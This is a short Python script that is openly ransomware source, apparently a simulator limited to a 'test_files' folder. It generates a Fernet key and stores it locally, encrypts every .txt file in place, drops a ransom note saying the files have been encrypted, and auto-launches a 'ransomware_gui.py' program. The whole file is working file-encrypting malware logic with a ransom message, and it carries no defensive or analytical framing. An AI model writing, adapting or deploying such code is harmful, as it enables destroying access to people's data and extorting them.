from cryptography.fernet import Fernet
import os
import subprocess

# Generate and save encryption key
key = Fernet.generate_key()
with open("keyfile.key", "wb") as keyfile:
    keyfile.write(key)

fernet = Fernet(key)
target_folder = "test_files"

# Encrypt all .txt files in target folder
for root, _, files in os.walk(target_folder):
    for file in files:
        if file.endswith(".txt"):
            path = os.path.join(root, file)
            with open(path, "rb") as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(path, "wb") as f:
                f.write(encrypted_data)

# Create ransom note
note = """
Your files have been encrypted!
To recover them, enter the decryption key below.
"""
with open("README.txt", "w") as f:
    f.write(note)

# Auto-launch the GUI
subprocess.Popen(["python3", "ransomware_gui.py"])
